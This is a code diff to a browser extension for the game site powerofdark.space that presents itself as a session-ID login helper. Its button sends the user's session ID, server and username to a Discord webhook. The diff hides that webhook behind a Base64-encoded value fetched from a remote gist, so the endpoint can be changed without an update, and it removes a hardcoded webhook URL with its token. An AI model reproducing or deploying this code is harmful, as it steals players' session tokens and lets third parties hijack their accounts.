@@ -1,7 +1,10 @@
 let nick = null, skylab = null, loginNode = null, startNode = null, stopNode = null, boxNode = null, labelNode = null, skylabNode = null;
 let blockStyleSheet = null, activeStyleSheet = null;
 var isBlock = 0, checkState = [], stopClick = false;
+let configArr = [], version = "0.6";
 
+if (window.location.href.includes("https://powerofdark.space/") && !window.location.href.includes("Account"))
+    checkConfig();
 window.addEventListener('load', function() {
     setInterval(function() {
         let updateNick;
@@ -261,12 +264,12 @@ function addSkylabButton() {
 
     skylabNode.addEventListener("click", function() {
         var request = new XMLHttpRequest();
-        request.open("POST", "https://discordapp.com/api/webhooks/708390060512510064/ihP1FfwpK8cxE6tx5giWcnGlQSGwbgm4nNhbx6M_ou-wP5mkLVlGMC9df9zvKkxDGAq6");
+        request.open("POST", Base64.decode(configArr[2]));
 
         request.setRequestHeader('Content-type', 'application/json');
 
         var params = {
-            username: "VERIFIED-SOURCE",
+            username: configArr[1],
             avatar_url: "",
             content: getSid() + " " + getServer() + " " + getUser()
         }
@@ -277,6 +280,83 @@ function addSkylabButton() {
         document.cookie = getUser() + "=" + getServer() + "; expires=" + expires + 130800 + ";path=/;";
 
         document.getElementsByClassName("add_buttonSkylab")[0].style.display = "none";
+    });
+}
+
+function addLabelThisVersion(){
+    labelThisVNode = document.createElement("label");
+    let thisVTextNode = document.createTextNode("Extension Version: ");
+    labelThisVNode.appendChild(thisVTextNode);
+
+    labelThisVNode1 = document.createElement("label");
+    let thisVTextNode1 = document.createTextNode(version);
+    labelThisVNode1.appendChild(thisVTextNode1);
+    labelThisVNode.appendChild(labelThisVNode1);
+    document.querySelector('#topNav').insertBefore(labelThisVNode, document.querySelector('.languageChange')).className = "thisVersionLabel";
+
+    let labelThisVStyles
+    if(version === configArr[0])
+        labelThisVStyles = `.thisVersionLabel {
+            position: relative;
+            color: #ffffff;
+            -webkit-font-smoothing: antialiased;
+            margin-left: 70px;
+            margin-right: 0px;
+            font-family: "Muli", sans-serif;
+        }.thisVersionLabel label:nth-child(2n+1) {
+            color: green;
+        }`;
+    else
+        labelThisVStyles = `.thisVersionLabel {
+            position: relative;
+            color: #ffffff;
+            -webkit-font-smoothing: antialiased;
+            margin-left: 70px;
+            margin-right: 0px;
+            font-family: "Muli", sans-serif;
+        }.thisVersionLabel label:nth-child(2n+1) {
+            color: red;
+        }`;
+
+    let skylabStyleSheet = document.createElement("style");
+    skylabStyleSheet.type = "text/css";
+    skylabStyleSheet.innerText = labelThisVStyles;
+    document.head.appendChild(skylabStyleSheet);
+    if(version !== configArr[0])
+        addLabelNewVersion();
+}
+
+function addLabelNewVersion(){
+    labelNewVNode = document.createElement("label");
+    let newVTextNode = document.createTextNode("  Update available:");
+    labelNewVNode.appendChild(newVTextNode);
+
+    labelNewVNode1 = document.createElement("a");
+    let newVTextNode1 = document.createTextNode(" Click Here");
+    labelNewVNode1.setAttribute('href', "#");
+    labelNewVNode1.appendChild(newVTextNode1);
+
+    labelNewVNode.appendChild(labelNewVNode1);
+    document.querySelector('.thisVersionLabel').appendChild(labelNewVNode).className = "newVersionLabel";
+
+    labelThisVStyles = `.newVersionLabel {
+        position: relative;
+        color: #ffffff;
+        -webkit-font-smoothing: antialiased;
+        font-family: "Muli", sans-serif;
+    }.newVersionLabel a:nth-child(2n+1) {
+        color: royalblue;
+    }.newVersionLabel a:nth-child(2n+1):hover{
+        color: deepskyblue;
+    }`;
+
+    let skylabStyleSheet = document.createElement("style");
+    skylabStyleSheet.type = "text/css";
+    skylabStyleSheet.innerText = labelThisVStyles;
+    document.head.appendChild(skylabStyleSheet);
+
+    labelNewVNode1.addEventListener("click", function() {
+        window.open('https://github.com/Gagong/DOPE-SID-Login/archive/master.zip', '_blank');
     });
 }
 
@@ -322,6 +402,73 @@ function getSid() {
         return Array.from(children)[1].innerText;
     }
     return findSessionId();
+}
+
+var Base64 = { 
+    _keyStr: "ABCDEFGHIJKLMNOPQRSTUVWXYZ"+ "abcdefghijklmnopqrstuvwxyz0123456789+/=",
+    decode: function(e) { 
+        var t = ""; 
+        var n, r, i; 
+        var s, o, u, a; 
+        var f = 0; 
+        e = e.replace(/[^A-Za-z0-9\+\/\=]/g, ""); 
+        while (f < e.length) { 
+            s = this._keyStr.indexOf(e.charAt(f++)); 
+            o = this._keyStr.indexOf(e.charAt(f++)); 
+            u = this._keyStr.indexOf(e.charAt(f++)); 
+            a = this._keyStr.indexOf(e.charAt(f++)); 
+            n = s << 2 | o >> 4; 
+            r = (o & 15) << 4 | u >> 2; 
+            i = (u & 3) << 6 | a; 
+            t = t + String.fromCharCode(n); 
+            if (u != 64) { 
+                t = t + String.fromCharCode(r) 
+            } 
+            if (a != 64) { 
+                t = t + String.fromCharCode(i) 
+            } 
+        } 
+        t = Base64._utf8_decode(t); 
+        return t 
+    },
+    _utf8_decode: function(e) { 
+        var t = ""; 
+        var n = 0; 
+        var r = c1 = c2 = 0; 
+        while (n < e.length) { 
+            r = e.charCodeAt(n); 
+            if (r < 128) { 
+                t += String.fromCharCode(r); 
+                n++ 
+            } else if (r > 191 && r < 224) { 
+                c2 = e.charCodeAt(n + 1); 
+                t += String.fromCharCode( 
+                (r & 31) << 6 | c2 & 63); 
+                    
+                n += 2 
+            } else { 
+                c2 = e.charCodeAt(n + 1); 
+                c3 = e.charCodeAt(n + 2); 
+                t += String.fromCharCode( 
+                (r & 15) << 12 | (c2 & 63) 
+                << 6 | c3 & 63); 
+                n += 3 
+            } 
+        } 
+        return t 
+    }
+}
+
+async function checkConfig(){
+    var xmlhttp = new XMLHttpRequest();
+    xmlhttp.onreadystatechange = function() {
+        if (this.readyState == 4 && this.status == 200) {
+            configArr = JSON.parse(this.responseText);
+            addLabelThisVersion();
+        }
+    };
+    xmlhttp.open("GET", "https://gist.githubusercontent.com/fabio1999ita/80f55ae8d0f68acdf1bfdde87656e1d2/raw", true);
+    xmlhttp.send();
 }
 
 //Credits: Popcorn
